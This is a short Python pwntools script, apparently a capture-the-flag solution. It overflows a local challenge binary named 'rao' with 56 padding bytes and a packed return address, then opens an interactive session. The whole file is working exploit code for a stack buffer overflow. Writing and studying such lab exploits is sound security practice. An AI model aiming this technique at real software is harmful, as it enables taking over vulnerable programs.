from pwn import *

p = process('./rao')
addr = 0x4011dd
#p.recvuntil("Input: ")
payload = b'A'*56
payload += p64(addr)
p.sendline(payload)

p.interactive()
